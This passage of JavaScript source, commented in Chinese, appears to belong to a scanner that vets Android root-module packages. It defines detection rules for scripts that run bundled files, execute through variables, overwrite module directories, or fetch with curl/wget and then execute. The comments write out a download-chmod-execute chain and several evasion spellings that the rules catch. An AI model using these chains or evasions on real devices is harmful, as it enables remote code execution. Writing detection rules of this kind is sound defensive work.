// advice 换成具名常量写明理由。不许 null（那是删证据），不许 low（low 参与定级口径）。
//
// **为什么动作不写在 `EXEC_BUNDLED_FILE.exclude` 里**（工单 §2 指的缝）：工厂那一段是
// `if (skipped) continue;`，`exclude` 返回 true 的语义只有「这个匹配不产出发现」，全行匹配都可
// 豁免就整行沉默 —— 它删得掉证据，给不出「finding 仍在 + severity 是 info」。而且工厂不把 `file`
// 传进 matcher（`exclude(m, line, ctx)` / `severityFor(m, line, ctx)` 都拿不到条目路径，
// `buildLineContexts` 的 ctx 只有行号/续行/命令位那几个字段），所以判据①在 matcher 里根本写不出来。
// 本仓「拿得到 file、又能改工厂产出的 finding」的既有先例只有包一层 `scan(file, text)`
// （SUSPICIOUS_DOMAIN_RULE 就是这么处理 severityFor 的 null 分档的）。路径是判据① ⇒ 只能走那层，
// 这也是本轮唯一不动 makeLineRule 工厂、不动 scan.mjs 的写法。判据本身仍是**一份**：
// `isOfficialInstallerShape`，包外层只做「按行号取回那一行，交给它判」。
//
// 记账语义一个字没动（本轮最容易被顺手改掉的一格）：引用解析（scan.mjs 的 resolveBundledRefs）
// 拿的是 `EXEC_BUNDLED_FILE.pattern` 原始正则，既不看 `exclude` 也不看本包装器的 severity，
// 所以被这一行 source 的 `customize.sh` 照常进扫描面。夹具 A1-N6 把这件事钉成可证伪的断言：
// 其中 (b) 那一发的载荷伪装成 customize.sh，只能靠这条引用升级进面 ⇒ 变异 M5（把豁免套进引用
// 解析）红在那里。结论只允许这么说：**豁免只影响这一行在报告里的呈现，不缩小扫描面。**

export const OFFICIAL_UPDATER_BINARY_ENTRY = 'META-INF/com/google/android/update-binary';
export const OFFICIAL_INSTALLER_TEMPLATE_LINE = '[ -f $MODPATH/customize.sh ] && . $MODPATH/customize.sh';
export const EXEC_OFFICIAL_INSTALLER_ADVICE =
  '条目路径与官方安装器模板行逐字相符 ⇒ 按标准安装流程形状记录（info，不参与定级）。'
  + '免掉的只是这一行的呈现：它 source 的 customize.sh 照常进扫描面逐行读；'
  + '条目路径或这一行的写法任一不相等，就回到 high。';

/** 判据②的归一面：只允许行尾单个 `\r` 与整行 trim，多一件都不许做。 */
function normalizeInstallerLine(line) {
  const s = String(line == null ? '' : line);
  return (s.endsWith('\r') ? s.slice(0, -1) : s).trim();
}

/** A1 的唯一判据点：路径逐字 ① 且整行逐字 ②③。两个参数都是字面比较，不做第三种归一。 */
export function isOfficialInstallerShape(file, line) {
  return String(file) === OFFICIAL_UPDATER_BINARY_ENTRY
    && normalizeInstallerLine(line) === OFFICIAL_INSTALLER_TEMPLATE_LINE;
}

const EXEC_BUNDLED_FILE_BASE = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'EXEC_BUNDLED_FILE', category: 'execution', severity: 'high',
  title: '脚本执行模块自带的另一个文件',
  // 注释行里的引用不是执行，按本仓既有先例豁免（HARDCODED_IP / SUSPICIOUS_DOMAIN / PRIVACY_SECRET
  // 都用 exclude: /^\s*#/）。豁免只作用于「报不报」：被引用的条目照样进扫描面，
  // 见 scan.mjs 的 resolveBundledRefs —— 它跑的是原始 pattern，不看 exclude。
  // fix5-F1 追加第二条豁免：纯模块路径清单（上一条命令的参数续行）不是执行，见上面
  // isModulePathListLine 的三个判据。它只看「行首那一支」的匹配，动词式与 `&&`/`||`/`(`/`;`
  // 之后的那一支照旧说话（实测真包里 `$(…)` 与 JS 的 exec('…') 都走后面那一支）。
  // fix6-F1：第五轮那一条只看形状，形状可伪造 —— 现在「处于参数位」由逻辑行的命令位说话，
  // 四条同时成立才沉默（缺一即报）：① 这一行确实是续行；② 逻辑行的命令位不是模块路径；
  // ③ 命令位在 ARG_ONLY_VERB 词表里；④ 这一行仍是第五轮那条纯清单形状。
  exclude(m, line, ctx) {
    if (/^\s*#/.test(line)) return true;
    if (!BARE_MOD_PATH_MATCH.test(m[0])) return false;       // 不是行首那一支，管不着
    if (!/^[\s]*$/.test(line.slice(0, m.index))) return false; // 前面还有词，不是行首形态
    // ① 上一条物理行没有以奇数个反斜杠结尾 ⇒ 这一行本身就站在命令位上 ⇒ 是执行，照报
    if (!ctx || !ctx.isContinuation) return false;
    // ② 逻辑行的命令位是模块路径 ⇒ 整条逻辑行都是「执行第一个路径，后面全是参数」，照报
    if (isModulePathToken(ctx.firstToken)) return false;
    // ③ 命令位不是「只吃文件参数的动词」⇒ 判不了它会不会把参数跑起来，fail closed 照报
    if (!ARG_ONLY_VERB.has(ctx.firstToken)) return false;
    // ④ 这一行里除了模块路径就只有重定向/续行反斜杠/引号残留（第五轮的判据，原样复用）
    return isModulePathListLine(line);
  },
  // 两种写法都要认：
  //   ① 动词式：`[busybox ]sh / bash / ash / source / . / exec / setsid / nohup` + 分隔 + 引号? + 模块目录路径；
  //   ② 命令位式：路径本身就在命令位（行首，或 ; && || ( { 之后）—— 那是「直接执行 $MODDIR/tool.bin」
  //      这种不带解释器的写法，和 sh 它一模一样都是把它拿去跑。
  // 前缀认四种：$MODPATH/、${MODDIR}/、$TMPMODDIR/、绝对 /data/adb/modules/…（评审 F5：只写
  // $MODPATH 不够，本仓自己的 SAFE_RM_TOKEN（上面）就把 $MODDIR 当正规模块目录变量）。
  // 分隔符允许空白或 ${IFS}/$IFS，且允许完全不带空白（fix2-P1：`sh"$MODDIR/x"` 实测曾被放过）；
  // 引号允许双引号或单引号；路径分隔符允许 / 与 \ —— 这三个都是实测过的逃逸写法（评审 fix1-④）。
  // fix2-P1 补的四个家族（全部评审实测曾 0 findings → low → auto-approve）：
  //   exec/setsid/nohup 前导（动词表扩容）；`trap "sh $MODDIR/x" EXIT` 与 `(sh $MODDIR/x)`
  //   （动词左边接受 `(`/引号 —— 引号里的命令串照样会被 shell 求值）；
  //   `sh"$MODDIR/x"`（动词与路径之间不再强制空白）。
  // **这里不再按「被引用的后缀像不像脚本」做排除**（评审 fix1-①：那是整条闸静默失效的根源）。
  // 排除条件必须是「它是否真的已经在扫描面里」，而那个判断只有 scan.mjs 的 scanZip 拿得到，
  // 所以「目标是已被逐行扫过的条目就撤掉这条 finding」写在 scan.mjs，不写在 pattern 里。
  // 后缀排除之所以必须删：classify() 让魔数赢过后缀，于是 ELF 改名 payload.js 时
  // 「后缀 .js」=「已被扫描」这个假设根本不成立。
  // fix5-F1：dot-source 那个动词以前写成 `\.(?!\\d)` —— 它只挡了 `.0` 这种数字开头，
  // 却把文件名里那个点当成了 source 内建（`.` 只有独立成词才是动词）。现在要求动词后面
  // 紧跟空白或 ${IFS}：`.$MODPATH/x` 展开成 `.data/adb/modules/…` 那种相对文件名，不再算执行；
  // `. $MODDIR/functions`、`.${IFS}$MODPATH/x` 这些真 source 一个字都没动。
  pattern: /(?:^|[\s;&|({["'])(?:(?:busybox\s+)?sh|bash|ash|source|\.(?=\s|\$\{?IFS)|exec|setsid|nohup)(?:\s*(?:\$\{?IFS\}?)?\s*)["']?(?:\$\{?(?:MODPATH|MODDIR|TMPMODDIR)\}?[\\/]|\/data\/adb\/modules\/)[^\s"']+|(?:^[\s]*|(?:&&|\|\||[;|({])[\s]*)["']?(?:\$\{?(?:MODPATH|MODDIR|TMPMODDIR)\}?[\\/]|\/data\/adb\/modules\/)[^\s"']+/,
  advice: '脚本执行了模块自带的另一个文件。审核必须把那个文件也当作可执行文本读一遍 —— 只扫被执行的这一行等于什么都没扫。',
});

/**
 * A1 的落点：包一层 scan，把「官方 update-binary + 模板逐字行」那一条 finding 的 severity 降成 info。
 * 只改两样：severity 与 advice；其余字段（ruleId/category/file/line/snippet/message）原样保留 ——
 * 证据本体不许被这条豁免改写。
 * 判据**只有一处实现点**：三条全在 `isOfficialInstallerShape` 里（含路径那一条），这一层只做
 * 「按 finding 的行号取回那一行，交给它判」。这里不写第二条路径比较 —— 写了就是两套口径，
 * 变异「只留整行判据（去掉路径）」会在 predicate 里摘掉判据①、却被这一层的短路挡住而测不到洞
 * （本轮第一版就是这么写的，实测 M2 因此假绿，见 task-a1-report.md）。
 * 纯函数：输出只由 (file, text) 决定，不看包、不看扫描面、不看时间。
 * 导出面保持与工厂一致（id/category/severity/title/advice/pattern/anchor/anchorSibling 全部由
 * 展开继承），所以 scan.mjs 的 resolveBundledRefs（吃 rule.pattern）与锚点闭包表都一字不动。
 */
export const EXEC_BUNDLED_FILE = {
  ...EXEC_BUNDLED_FILE_BASE,
  scan(file, text) {
    const findings = EXEC_BUNDLED_FILE_BASE.scan(file, text);
    if (!findings.length) return findings;
    // 与工厂同一个 split ⇒ finding.line 与这里取的行号天然对齐
    const lines = String(text == null ? '' : text).split(/\r?\n/);
    return findings.map((f) => (isOfficialInstallerShape(file, lines[f.line - 1]) && f.severity !== 'info'
      ? { ...f, severity: 'info', advice: EXEC_OFFICIAL_INSTALLER_ADVICE }
      : f));
  },
};

// fix2-P1/P2：变量间接执行 —— `sh $X` / `do $f` 这类「目标在变量里」的写法。
// 这条规则只在**形状层**存在：它把「解释器动词 + 裸 $VAR」与「for-in 模块目录 glob + do $VAR」
// 这些 EXEC_BUNDLED_FILE（只认字面 $MODDIR 前缀）永远看不见的形状带进检测面；
// 「变量到底钉不钉得住」的判断在 scan.mjs（那里拿得到同文件的赋值），纯逐行函数不替它说话。
// 假阳性边界（评审要求「不许扩成整行含 $MODDIR 就亮」的反面）：
//   * 三个模块目录前缀变量名（MODPATH/MODDIR/TMPMODDIR）本身不在这条触发 —— 那是
//     EXEC_BUNDLED_FILE 的领地，重复触发只会双报；
//   * 字面迭代子的常规循环（`for f in a b; do $f; done`，迭代子里没有 $）不触发。
export const EXEC_INDIRECT = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'EXEC_INDIRECT', category: 'execution', severity: 'high',
  title: '经变量间接执行目标，扫描器必须先钉住变量值',
  exclude(m, line) {
    if (/^\s*#/.test(line)) return true;
    if (m[1] !== undefined) return false; // 动词位在裸 $VAR 上：一律触发，fail closed
    const forIn = line.match(/\bfor\s+\w+\s+in\s+([^;&|\n]*)/);
    if (forIn && !/\$/.test(forIn[1])) return true; // 字面迭代子的常规循环
    return false;
  },
  // ① 解释器/前导动词 + 空白 + 引号? + $VAR；② do/then/else + $VAR。
  // 两处都用负先行排除 MODPATH|MODDIR|TMPMODDIR 三个前缀变量（交给 EXEC_BUNDLED_FILE）。
  // fix5-F1 顺手核对过同一份动词表里的 `.`：这条的动词后面本来就写死了 `\s+`，
  // 所以 `.` 在这条里只能独立成词，没有 EXEC_BUNDLED_FILE 那个「文件名里的点」的问题。
  pattern: /(?:^|[\s;&|({["'])(?:(?:busybox\s+)?sh|bash|ash|source|\.|exec|setsid|nohup)\s+["']?\$\{?(?!\{?(?:MODPATH|MODDIR|TMPMODDIR)\b)([A-Za-z_][A-Za-z0-9_]*)|(?:^|[\s;&|(])(?:do|then|else)\s+\$\{?(?!\{?(?:MODPATH|MODDIR|TMPMODDIR)\b)([A-Za-z_][A-Za-z0-9_]*)/,
  advice: '脚本经变量间接执行一个目标；扫描器能否把变量钉成包内具体路径由 scanZip 判定，钉不住就按未验证引用处理。',
});

// fix2-P3：「名字在扫描面」不等于「字节被证实」。
// 在设备上把外部字节写进模块目录的解包/拷贝/重定向动作，会让随后 `sh $MODDIR/x` 执行的
// 磁盘内容不再是扫描面读过的那份 —— 所以这行本身就是发现，并且它让引用撤销判据失效（见 scan.mjs）。
// 假阳性边界：`cp -f busybox $MODPATH/system/xbin/bb` 这种「向自有覆盖层拷模块自带文件」
// 是本仓 CLEAN 夹具的正经写法，cp/mv 分支因此只认「源在包外（/sdcard、/storage、/data/local/tmp）」。
export const MODDIR_RUNTIME_WRITE = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'MODDIR_RUNTIME_WRITE', category: 'execution', severity: 'high',
  title: '运行期向模块目录写出/解包外部内容',
  exclude: /^\s*#/,
  pattern: /(?:\b(?:busybox\s+)?(?:unzip|tar|7z|gunzip|unxz)\b[^\n]*(?:\s-d\s+|\s-C\s+|--directory\s+)[^\n]*(?:["']?\$\{?(?:MODPATH|MODDIR|TMPMODDIR)\}?(?:[\\/]|(?=[\s"']|$))|["']?\/data\/adb\/modules\/)|\b(?:cp|mv)\b(?:\s+-\w+)*\s+["']?(?:\/sdcard\/|\/storage\/|\/mnt\/sdcard\/|\/data\/local\/tmp\/)[^\s"']*\s+["']?\$\{?(?:MODPATH|MODDIR|TMPMODDIR)\}?(?:[\\/]|(?=[\s"']|$))|>>?\s*["']?\$\{?(?:MODPATH|MODDIR|TMPMODDIR)\}?[\\/][^\s"']*|>>?\s*["']?\/data\/adb\/modules\/[^\s"']+)/,
  advice: '该写法会在设备上用外部字节覆盖模块目录里的文件：扫描面读过的同名条目与实际落盘内容不再是同一份。'
    + '凡在此之后被执行的包内路径都必须人工核对写出来源（zip 在哪、从哪下载、校验什么）。',
});

/**
 * Task 3：DOWNLOAD_THEN_EXEC —— 「先用 curl/wget 把远程内容下载到磁盘，再执行它」。
 *
 * 洞（工单 §1，2026-10-14 在 0f4ddbe 实测，本会话不重新推演）：
 *   curl <url> -o /data/local/tmp/u → chmod 700 <同一路径> → /data/local/tmp/u &
 *   整包 findings 只有 NETWORK_FETCH/low ⇒ low + 首次收录 = **auto-approve**，
 *   这条链走的是机器人自动合并通道。管道写法（`curl … | sh`）一直由 PIPE_TO_SHELL 判 high/block，
 *   于是「同一件事换个写法就换一个结论」。这一条把落盘写法拉到同一档：high / block（转人工，
 *   不是任何自动拒绝 —— 判断权留给双签，与 PROP_BOOT_SPOOF 同一条取舍）。
 *
 * 为什么不用 makeLineRule：判据跨行（sink 在一行、执行在另一行），单行匹配看不见配对。
 * 对外形状仍与工厂一致：{ id, category, severity, title, advice, anchor, anchorSibling, pattern, scan }，
 * scan(file, text) -> Finding[]，Finding 字段与工厂逐一对齐（scan.test.mjs 的 T3 形状用例钉着）。
 * 纯函数：只吃 (file, text)，不读外部状态、不看时间 —— 受规则表完整性那条「两次结果一致」断言约束。
 *
 * `pattern: null` 是**有意为之而不是漏了**：这条规则的匹配不住在单个正则上；
 * redactText 遍历规则时对 `!r.pattern` 直接 continue（scan.mjs 里那一行），
 * 而本规则 category 是 execution、压根不进 REDACT_RULES（那条 filter 只挑 privacy 类）——
 * null 既不会让脱敏漏跑一步，也不会让它崩；写个假正则反而是谎言。
 *
 * 组合方式（计划原话，保留）：三个小函数，一个组合。
 *   downloadSinks(text) -> Map<归一化路径, 首个落地行>
 *   executedPaths(text) -> [{ path, line, kind }]
 *   交集：路径相等且执行行 > 落地行 ⇒ 一条链，报在执行行上
 *
 * Task 3.1（第二版，只动写法面）：`dteOutCluster` 收融合短选项簇与带值连写（`-qO <路径>` / `-sLo <路径>` /
 * `-o<路径>`），`dteDownloader` 多认「命令位解析后末段是 curl/wget」这一格，`DTE_STDOUT_PATH` 继续把
 * 标准输出形态挡在外面。上面那三行组合方式一字未改 —— 判据还是「路径精确相等 且 执行行 > 落地行」。
 * 这一轮之后**仍然看不见**的（计划 §0.18 与工单 §2 点名的已知限度）：`DOWNLOADER=$(command -v curl)`
 * 那一族（命令替换钉不住）、`bounded 90 "$BB" wget`（命令位是包装器）、位置参数当 sink（`-O "$2"`）、
 * 控制词站在命令位（`if wget -qO …` / `if "$MODPATH/x" -h` —— 后者挡住的是**执行**那一半，
 * sensitive-props 那条真链今天仍然 0 命中，见任务报告「工单与现实的差」）、下载 zip 解出脚本再执行、跨文件链。
 */

/** 每文件每规则的上限：与工厂的 maxPerFile 同值，但基数是**链**（不是行、也不是执行形态数）。 */
const MAX_DTE_CHAINS_PER_FILE = 20;
/**
 * 下载工具的字面量动词表。**Task 3.1 §2(b) 之后命令位的识别不止这张表**：
 * 见 `dteDownloader` —— 它只额外认「解析变量后按 `/` 取的末段字面量等于 curl/wget」这一格，
 * `busybox wget` 那种前导形态（命令位是 `busybox`）与 `bounded 90 "$BB" wget` 仍然不在能力内。
 */
const DTE_TOOLS = new Set(['curl', 'wget']);
/**
 * 执行动词表（工单 §2 逐字钉死）：只有这五个词会把「它的参数」拿去跑。
 * **故意不收的两族**（收进来就是拿合法形状换人工容量）：
 *   * chmod / chown / chcon / restorecon —— `chmod 644` 一个下载来的配置文件是合法形状，
 *     所以 chmod **只作为同一条链的证据进 snippet**，单独一条 chmod 永远不构成执行
 *     （工单 §3.9 把「下载 + chmod、没有执行」那一格列为已知限度：今天 low，T3 之后仍是 low）；
 *   * exec / setsid / nohup / busybox / xargs / env —— 与 ARG_ONLY_VERB 那一族的方向相反，
 *     本规则不扩这张表；要扩得另开一轮并补夹具。
 * 下面 `chmod` 记的 mode（Task 3.1 §3 加的字段）本规则**一个都不看** —— 它只把 chmod 行当同一条链的证据
 * 带进 snippet；「加成可执行」这句话由另一条规则 DOWNLOAD_TO_MODULE_EXEC 单独说，两条规则的判据互不借用。
 */
const DTE_EXEC_VERBS = new Set(['sh', 'bash', 'ash', 'source', '.']);
/** 语句边界符：被它们复位之后的第一个词同样站在命令位上 —— 与 PIPE_TO_SHELL / EXEC_BUNDLED_FILE
 *  的左边界类 `(?:^|[\s"';&|`(])` 同一口径（`&&`、`||` 在词法层就是两个相邻的 & 与 |）。 */
const DTE_SEP = /^[;|&()]$/;
/**
 * 路径归一化只做三件事（工单 §2.6，一件不多做）：
 *   ① 去外层引号 —— 复用工厂的 UNQUOTE_EDGE，不写第二份；
 *   ② 去词尾反斜杠 —— 续行形态里 `-o /data/local/tmp/u \` 的那个尾巴；
 *   ③ 把模块目录前缀折成模块相对路径。
 * 第③件的字面量本文件已经有一份（MOD_PATH_TOKEN / BARE_MOD_PATH_MATCH），scan.mjs 也有一份
 * （REF_MODDIR_PREFIX / REF_ABS_PREFIX，那份还要求 moduleId 相等才肯剥）。这里**不搬第三份**：
 * 跨行规则拿不到 moduleId，所以绝对形态只剥 `/data/adb/modules/` 本身，模块 id 留在键里 ——
 * 于是 `/data/adb/modules/A/x` 与 `/data/adb/modules/B/x` 不会被算成同一条链（别的模块的目录不是
 * 本包的东西，这个方向 fail closed 的理由与 scan.mjs pinLiteralValue「只有等于本次模块 id 时才剥」同一份）。
 * 代价如实写进已知限度：同一篇文本里 `$MODPATH/x` 与 `/data/adb/modules/<id>/x` 两种拼法混用时不相等。
 * 除此之外不许任何模糊匹配 —— 前缀/子串/相似度会把 `/data/local/tmp/u` 和 `/data/local/tmp/util` 算成一条链。
 */
const DTE_MOD_REL = '\u0000';                                  // 模块相对路径的内部标记（不可能出现在真实参数里）
const DTE_MODDIR_PREFIX = /^\$\{?(?:MODPATH|MODDIR)\}?[\\/]/;  // 工单点名的四个写法：$MODDIR / $MODPATH / ${MODDIR} / ${MODPATH}
const DTE_MODULES_ABS = /^\/data\/adb\/modules\//;             // 同一族绝对写法（来源见上面那段说明）
const DTE_URL = /^[a-z][a-z0-9+.-]*:\/\/[^/?#]*(\/[^?#]*)?$/i;
/** 输出选项：值在下一个词，或紧跟 `=`。`-o-` / `-O -` / `--output -` 是标准输出，不是落盘。 */
const DTE_OUT_FLAG = /^(?:-[oO]|--output)$/;
/** 目录前缀选项（wget 专有）：落地路径 = 目录 + URL 的 basename。 */
const DTE_DIR_FLAG = /^(?:-P|--directory-prefix)$/;
/**
 * Task 3.1 §2(a)：融合短选项簇与带值连写。**只动写法面**——收的是「同一个 `-o`/`-O` 的拼法」，
 * 不是「更少的证据」：值仍然要么紧跟在簇位之后，要么就是下一个词，路径判据一字未动。
 *
 * 真包的写法（计划 §0.18 逐字表）：`wget -qO "$MODPATH/resetprop-rs" …`（sensitive-props:207）、
 * `curl -sLo …`（208）、`wget … -qO "$TMPDIR/$FILENAME" …`（tailscaled:29）、`curl -sLo x.tar.gz`（beszel:56）。
 * 按 shell 的短选项簇语义，**第一个** `o`/`O` 就吃掉余下的一切：
 *   `-qO` / `-sLo` → 后面没有剩余 ⇒ 值在下一个词；
 *   `-o<path>` / `-O<path>` / `-qO<path>` → 剩余就是值（带值连写）；
 *   `-sLoo` → 第一个 `o` 才是簇位，剩余 `o` 是它的值（一个相对路径，钉不住 ⇒ 不立 sink）——
 *     工单 §2(a) 点名的正是这一格：末位是 `o` 不等于这一位是 `o`。
 * 长选项（`--output=<path>`）走既有的 `=` 分支，这里**不碰**：`-` 后面紧跟 `-` 一律不认，
 * 否则 `--output` 里那个 `o` 会被当成簇位、把 `utput` 当成路径。
 * @returns {string|null} null = 这个词不是落盘簇；'' = 簇位后没有剩余（值在下一个词）；其余 = 带值连写的值
 */
function dteOutCluster(w) {
  if (!/^-[^-]/.test(w)) return null;
  const m = /^-[A-Za-z]*?[oO](.*)$/.exec(w);
  return m ? m[1] : null;
}
/**
 * 标准输出与描述符的写法不立 sink（工单 §2(a) 点名要**继续排除**的那一族）。
 * 既有实现靠 `dteNormalize('-')` 返回 null 来挡 `-O -` / `-o-`；`-o/dev/stdout` 这种**带值连写**
 * 走到路径判据时是个合法的绝对路径，所以这一格必须显式挡 —— 真包活样本：Yuri:46 `-qO- "$1"`、
 * tailscaled:17 `-qO- "https://api.github.com/…" |`。
 */
const DTE_STDOUT_PATH = /^\/dev\/(?:std(?:out|err|in)|fd\/\d+)$/;

/** ①②：去外层引号 + 去词尾反斜杠（与工厂的 logicalFirstToken 对命令位做的事一致，同一份 UNQUOTE_EDGE）。 */
function dteWord(t) {
  return String(t == null ? '' : t).replace(UNQUOTE_EDGE, '').replace(/\\+$/, '');
}

/**
 * 词法层：把一条物理行切成词，引号内的边界符不算边界，边界符单独成词。
 * 只给本规则用 —— 它不是为了「解析 shell」，是为了让 `-o` 的下一个词、`>` 的下一个词
 * 与「命令位上的那个词」有确定的所指。引号**留给词本身**（`"$D"`），交给 dteNormalize 去外层，
 * 这样 `ui_print "/data/local/tmp/u"` 里的路径仍然是「ui_print 的参数」而不是一个独立命令。
 */
function dteTokens(line) {
  const s = String(line == null ? '' : line);
  const out = [];
  let cur = '';
  let q = null;
  const flush = () => { if (cur !== '') { out.push(cur); cur = ''; } };
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (q) { cur += c; if (c === q) q = null; continue; }
    if (c === '"' || c === "'") { q = c; cur += c; continue; }
    if (DTE_SEP.test(c)) { flush(); out.push(c); continue; }
    if (/\s/.test(c)) { flush(); continue; }
    cur += c;
  }
  flush();
  return out;
}

/**
 * 同文件内的字面量赋值表：`NAME=/绝对路径`（含 `NAME="${MODDIR}/x"` 这类外层引号）。
 * 口径与 scan.mjs 的 collectVarValues 一致的两点：目录根变量（MODPATH/MODDIR/TMPMODDIR）不参与
 * （那是前缀，不是值），以及「只认第一个赋值」（保守，且与 downloadSinks 的「首个落地行」同向）。
 * 命令替换（`A=$(curl …)`）与反引号钉不住 —— 本规则只吃字面量，钉不住就不替换。
 * **跨文件赋值不在能力内**（install.sh 里下载、service.sh 里执行）：这一条只有单篇文本。
 */
function dteLiteralAssignments(lines) {
  const map = new Map();
  for (const raw of lines) {
    if (/^\s*#/.test(raw)) continue;
    const re = /(?:^|[;&|(\s])(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)=(["']?)([^\s"'`;|&)<>]*)/g;
    let m;
    while ((m = re.exec(raw))) {
      const name = m[1];
      if (name === 'MODPATH' || name === 'MODDIR' || name === 'TMPMODDIR') continue;
      const value = m[3];
      if (!value || value.startsWith('$(') || value.startsWith('`')) continue;
      if (!map.has(name)) map.set(name, value);
    }
  }
  return map;
}

/** 把 `$NAME` / `${NAME}` 换成字面值。有界三轮：自指与互指的写法会停在「仍以 $ 开头」上，仍不模糊。 */
function dteResolveVars(s, assign) {
  if (!assign.size || s.indexOf('$') < 0) return s;
  let cur = s;
  for (let round = 0; round < 3 && cur.length < 4096; round++) {
    const next = cur.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g,
      (all, a, b) => {
        const v = assign.get(a || b);
        return v === undefined ? all : v;
      });
    if (next === cur) break;
    cur = next;
  }
  return cur;
}

/**
 * Task 3.1 §2(b)：命令位那个词「算不算下载器」。**这一族的口子比 §2(a) 小，而且边界是主控拍的，没扩**：
 * 字面量 `curl`/`wget` 之外只多收一种 —— 先过 `dteResolveVars`（钉不住就原样），按 `/` 取末段，
 * 末段去掉 `$`/`${}` 之后**字面量等于 `curl` 或 `wget`** 才算下载段。于是：
 *   认 —— `$curl`（microG:27，同文件 17 行 `curl=$MODPATH/tools/curl/arm64eabi-v7a/curl` 解析后末段也是 curl）、
 *         `$MODPATH/addon/curl`（Pixelify:686 自带二进制）、`/system/bin/wget` 这类同一族的绝对写法；
 *   不认 —— `bounded 90 "$BB" wget -O "$2"`（AlwaysStrong:83：命令位是 `bounded`，要认出 `wget` 就得知道
 *         `$BB` 指向什么，那是运行期探测出来的路径、可伪造且常跨文件 —— 写进已知限度，没实现）、
 *         `"$DOWNLOADER" … -o "$ZIP_PATH.tmp"`（Integrity-Box:56：末段是 `DOWNLOADER` 而不是 `curl`，
 *         它的值来自 `DOWNLOADER=$(command -v curl)` 命令替换，`dteLiteralAssignments` 按既有口径钉不住 ——
 *         **这是故意的**，放宽它等于承认「谁都能把自己伪装成 wget」）、
 *         `if wget -qO …`（sensitive-props:207：命令位是 `if`，末段不是 curl/wget ⇒ 这一行的 sink
 *         只能由 208 那半句 `curl -sLo` 立 —— 控制词穿透不在本轮授权面内，见任务报告「工单与现实的差」）。
 * 长度守卫：`--`/`-` 开头的词是选项位，不是命令位（否则 `--curl` 这种词会被当成下载器）。
 */
function dteDownloader(word, assign) {
  if (DTE_TOOLS.has(word)) return true;
  if (!word || word.startsWith('-')) return false;
  const last = String(dteResolveVars(word, assign)).split('/').pop() || '';
  const bare = last.replace(/^\$\{?/, '').replace(/\}$/, '');
  return bare === 'curl' || bare === 'wget';
}

/**
 * 归一化：①②③ + 变量替换，然后判「这到底是不是一个路径」。
 * @returns {string|null} null = 不是路径（URL、`-`（标准输出）、裸词、选项），因此不能当 sink 也不能当执行目标
 */
function dteNormalize(tok, assign) {
  const stripped = dteWord(tok);
  if (!stripped || DTE_SEP.test(stripped)) return null;
  const s = dteResolveVars(stripped, assign);
  if (!s) return null;
  if (DTE_MODDIR_PREFIX.test(s)) return DTE_MOD_REL + s.replace(DTE_MODDIR_PREFIX, '');
  if (DTE_MODULES_ABS.test(s)) return DTE_MOD_REL + 'data/adb/modules/' + s.replace(DTE_MODULES_ABS, '');
  // 绝对路径原样比较；钉不住的变量（`$FOO/u`）也原样比较 —— 两侧同一个拼法才算一条链，
  // 这是「精确相等」，不是模糊匹配；钉不住时它永远不会与别的写法相等。
  if (/^\//.test(s) || /^\$\{?[A-Za-z_]/.test(s)) return s;
  return null;
}

/** URL 的 basename：末段为空（以 `/` 结尾）或只有 host 时返回 null —— 工单 §2.2「不要猜」。 */
function dteUrlBasename(tok) {
  const s = dteWord(tok);
  const m = DTE_URL.exec(s);
  if (!m) return null;
  const segs = String(m[1] == null ? '' : m[1]).split('/').filter(Boolean);
  return segs.length ? segs[segs.length - 1] : null;
}

/**
 * 按 buildLineContexts 的**逻辑行**分组，再把每组按语句边界符切成命令段。
 * 分组与「这一组站在命令位的那个词」都来自 buildLineContexts —— 本规则不自己数第一个词。
 * 注释行（`^\s*#`）整行不参与：既不是 sink 也不是执行形态（与 HARDCODED_IP / EXEC_BUNDLED_FILE
 * 等规则同一豁免口径）。
 * @returns {Array<{headLine:number, command:string, toks:Array<{tok:string,line:number}>, segments:Array<Array<{tok:string,line:number}>>}>}
 */
function dteGroups(lines, contexts) {
  const byHead = new Map();
  const order = [];
  for (let i = 0; i < lines.length; i++) {
    if (/^\s*#/.test(lines[i])) continue;
    const ctx = contexts[i];
    const key = ctx.logicalFirstLine;
    let g = byHead.get(key);
    if (!g) {
      // ctx.firstToken 是**整条逻辑行**的命令位（奇数个反斜杠续行时它可能根本不在这个 i 行上）
      g = { headLine: ctx.logicalFirstLine, command: ctx.firstToken, toks: [], segments: [] };
      byHead.set(key, g);
      order.push(g);
    }
    for (const t of dteTokens(lines[i])) g.toks.push({ tok: t, line: i + 1 });
  }
  for (const g of order) {
    let cur = [];
    for (const t of g.toks) {
      if (DTE_SEP.test(t.tok)) { if (cur.length) { g.segments.push(cur); cur = []; } continue; }
      const w = dteWord(t.tok);
      if (!w) continue; // 纯反斜杠（续行符本身）不是词
      cur.push({ tok: t.tok, line: t.line });
    }
    if (cur.length) g.segments.push(cur);
  }
  return order;
}

/** 下载段里的落盘动作（-o/-O/--output 与其短选项簇形态、-P/--directory-prefix、> 与 >>），逐个写进 sinks。 */
function dteCollectSinks(segments, assign, sinks) {
  for (const seg of segments) {
    const head = dteWord(seg[0].tok);
    if (!dteDownloader(head, assign)) continue;               // 命令位不是下载工具 ⇒ 这一段的词全是参数
    for (let k = 1; k < seg.length; k++) {
      const w = dteWord(seg[k].tok);
      const eq = /=(.*)$/.exec(w);
      let flag = w;
      let operand = null;
      let opLine = seg[k].line;
      if (DTE_OUT_FLAG.test(w) || DTE_DIR_FLAG.test(w)) {
        operand = seg[k + 1] ? seg[k + 1].tok : null;
        if (seg[k + 1]) { opLine = seg[k + 1].line; k++; }
      } else if (eq && (DTE_OUT_FLAG.test(w.slice(0, eq.index)) || DTE_DIR_FLAG.test(w.slice(0, eq.index)))) {
        flag = w.slice(0, eq.index);
        operand = eq[1];
      } else if (/^>{1,2}$/.test(w)) {                        // `> path` / `>> path`
        operand = seg[k + 1] ? seg[k + 1].tok : null;
        flag = '>';
        if (seg[k + 1]) { opLine = seg[k + 1].line; k++; }
